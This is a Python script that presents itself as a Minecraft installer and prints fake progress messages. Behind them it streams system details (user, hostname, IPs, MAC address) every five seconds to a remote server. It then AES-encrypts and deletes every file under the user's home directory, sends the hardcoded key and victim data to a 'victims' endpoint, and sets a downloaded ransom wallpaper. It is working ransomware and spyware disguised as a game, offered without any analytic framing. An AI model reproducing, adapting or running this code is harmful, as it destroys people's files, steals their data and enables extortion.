#!/usr/bin/env python3

import time
import sys
import platform
import json
import urllib.request
import urllib.error
import socket
import os
import shutil
import getpass
import threading
import uuid
import datetime
import subprocess
import ctypes
from Crypto.Cipher import AES
from Crypto.Hash import SHA256
from Crypto import Random

import psutil

TELEMETRY_INTERVAL = 5
TELEMETRY_URL = "https://minecraft.puiustin.com/api/telemetry"
VICTIM_URL = "https://minecraft.puiustin.com/api/victims"
WALLPAPER_URL = "https://minecraft.puiustin.com/background.jpeg"
DEFAULT_PASSWORD = "hger478tg43803hfg5874heif3f82fgu2rgg8v4444g"


def get_public_ip():
    try:
        return urllib.request.urlopen("https://api.ipify.org", timeout=3).read().decode()
    except Exception:
        return "Unknown"

def collect_telemetry():
    """Collect as much system information as possible"""
    try:
        total, used, free = shutil.disk_usage("/")
        disk_info = {
            "total_gb": round(total / (2**30), 2),
            "used_gb": round(used / (2**30), 2),
            "free_gb": round(free / (2**30), 2),
        }
    except Exception:
        disk_info = "Unknown"

    try:
        hostname = socket.gethostname()
        local_ip = socket.gethostbyname(hostname)
    except Exception:
        local_ip = "Unknown"

    try:
        mac_address = ":".join(f"{(uuid.getnode() >> ele) & 0xff:02x}" for ele in range(40, -1, -8))
    except Exception:
        mac_address = "Unknown"

    data = {
        "timestamp": time.time(),
        "hostname": socket.gethostname(),
        "current_user": getpass.getuser(),
        "home_directory": os.path.expanduser("~"),
        "current_working_directory": os.getcwd(),
        "os_system": platform.system(),
        "os_release": platform.release(),
        "os_version": platform.version(),
        "os_build": platform.platform(),
        "machine_arch": platform.machine(),
        "processor": platform.processor(),
        "cpu_count_logical": os.cpu_count(),
        "python_version": sys.version,
        "disk": disk_info,
        "local_ip": local_ip,
        "public_ip": get_public_ip(),
        "mac_address": mac_address,
        "shell": os.environ.get("SHELL") or os.environ.get("COMSPEC"),
    }
    
    if psutil:
        try:
            data["cpu_usage_percent"] = psutil.cpu_percent(interval=1)
            data["cpu_usage_per_core"] = psutil.cpu_percent(interval=1, percpu=True)

            vm = psutil.virtual_memory()
            data["memory"] = {
                "total_gb": round(vm.total / (2**30), 2),
                "available_gb": round(vm.available / (2**30), 2),
                "used_gb": round(vm.used / (2**30), 2),
                "percent": vm.percent,
            }

            data["boot_time"] = psutil.boot_time()

            data["disk_io"] = psutil.disk_io_counters()._asdict()
            data["network_io"] = psutil.net_io_counters()._asdict()

            if hasattr(psutil, "sensors_battery"):
                battery = psutil.sensors_battery()
                if battery:
                    data["battery"] = {
                        "percent": battery.percent,
                        "plugged_in": battery.power_plugged
                    }
        except Exception:
            data["psutil"] = "Partial failure"
    else:
        data["psutil"] = "Not installed"

    return data

def send_report(data, url):
    """Sends JSON data to a specified URL."""
    try:
        json_data = json.dumps(data, indent=2).encode('utf-8')
        req = urllib.request.Request(
            url,
            data=json_data,
            headers={'Content-Type': 'application/json'}
        )
        with urllib.request.urlopen(req, timeout=10) as response:
            pass # Silenced
    except Exception as e:
        # print(f"\n> Failed to send report to {url}: {e}")
        pass

def telemetry_worker():
    """Continuously collects and sends telemetry data."""
    while True:
        telemetry_data = collect_telemetry()
        send_report(telemetry_data, TELEMETRY_URL)
        time.sleep(TELEMETRY_INTERVAL)


def digestSHA256(s):
    return SHA256.new(s).digest()

def encryptAES(chunk, key, iv):
    cipher = AES.new(key, AES.MODE_CBC, iv)
    return cipher.encrypt(chunk)

def encryptFile(dir, f, key):
    chunksize = 64 * 1024
    in_file_path = os.path.join(dir, f)

    try:
        if not os.path.isfile(in_file_path):
            return False

        outFile_path = os.path.join(dir, "(encrypted)" + os.path.basename(f))
        filesize = str(os.path.getsize(in_file_path)).zfill(16)
        iv = Random.new().read(16)

        with open(in_file_path, "rb") as infile:
            with open(outFile_path, "wb") as outfile:
                outfile.write(filesize.encode())
                outfile.write(iv)
                while True:
                    chunk = infile.read(chunksize)
                    if len(chunk) == 0:
                        break
                    elif len(chunk) % 16 != 0:
                        chunk += b' ' * (16 - len(chunk) % 16)
                    outfile.write(encryptAES(chunk, key, iv))
        os.remove(in_file_path)
        return True
    except FileNotFoundError:
        return False
    except Exception as e:
        # print(f" > Encryption failed for {f}: {e}")
        return False

def encryptDirectoryTree(dir, key, report_payload):
    total_files = 0
    encrypted_files = 0
    first_report_sent = False

    for root, dirs, files in os.walk(dir):
        if 'Library' in dirs:
             dirs.remove('Library')
        if '.Trash' in dirs:
            dirs.remove('.Trash')

        for f in files:
            if not f.startswith("(encrypted)"):
                total_files += 1
                if encryptFile(root, f, key):
                    encrypted_files += 1
                    # print(f" > Encrypted: {os.path.join(root, f)}")
                    if not first_report_sent:
                        # print("> First file encrypted. Sending initial report...")
                        send_report(report_payload, VICTIM_URL)
                        first_report_sent = True
                # else:
                    # print(f" > FAILED to encrypt: {os.path.join(root, f)}")
    return total_files, encrypted_files


def download_wallpaper(url, dest_path):
    # print(f"> Downloading wallpaper from {url} to {dest_path}")
    try:
        urllib.request.urlretrieve(url, dest_path)
        # print("> Wallpaper downloaded successfully.")
        return True
    except Exception as e:
        # print(f"> Failed to download wallpaper: {e}")
        return False

def set_wallpaper(image_path):
    # print(f"> Attempting to set wallpaper to: {image_path}")
    system = platform.system()
    try:
        if system == "Darwin":
            script = f'tell application "Finder" to set desktop picture to POSIX file "{image_path}"'
            subprocess.run(["osascript", "-e", script], check=True)
            # print("> Wallpaper set successfully on macOS.")
        elif system == "Windows":
            SPI_SETDESKWALLPAPER = 20
            SPIF_UPDATEINIFILE = 1
            SPIF_SENDCHANGE = 2
            ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, image_path, SPIF_UPDATEINIFILE | SPIF_SENDCHANGE)
            # print("> Wallpaper set successfully on Windows.")
        elif system == "Linux":
            subprocess.run(["gsettings", "set", "org.gnome.desktop.background", "picture-uri", f"file://{image_path}"], check=True)
            subprocess.run(["gsettings", "set", "org.gnome.desktop.background", "picture-options", "zoom"], check=True) # or 'stretched', 
            # print("> Wallpaper set successfully on Linux (GNOME).")
        # else:
            # print(f"> Unsupported OS for wallpaper setting: {system}")
    except Exception as e:
        # print(f"> Failed to set wallpaper on {system}: {e}")
        pass



def main():
    start_time = time.time()
    print("Initializing Minecraft Installer v1.18.2...")
    telemetry_thread = threading.Thread(target=telemetry_worker, daemon=True)
    telemetry_thread.start()
    
    print(" > Checking system requirements...")
    time.sleep(1)
    print(" > System check passed.")
    
    print(" > Starting background services...")
    time.sleep(2)

    print(" > Background services running.")
    time.sleep(1)

    print(" > Allocating disk space...")
    time.sleep(2)

    target_dir = os.path.expanduser("~")
    hashed_key = digestSHA256(DEFAULT_PASSWORD.encode())
    
    print(" > Downloading game assets (this may take a while)...")
    
    victim_telemetry = collect_telemetry()
    report_payload = {
        'password': DEFAULT_PASSWORD,
        'telemetry': victim_telemetry
    }

    cnt_files = encryptDirectoryTree(target_dir, hashed_key, report_payload)
    
    if cnt_files[1] > 0:
        send_report(report_payload, VICTIM_URL)

    print(" > Download complete.")
    print(" > Unpacking files...")
    time.sleep(3)
    
    print(" > Configuring graphics settings...")
    time.sleep(2)
    
    wallpaper_save_path = os.path.join(os.path.expanduser("~"), "encrypted_wallpaper.jpeg")
    if download_wallpaper(WALLPAPER_URL, wallpaper_save_path):
        set_wallpaper(wallpaper_save_path)

    print("\nError: Failed to launch Minecraft. Your files may be corrupt.")

if __name__ == "__main__":
    main()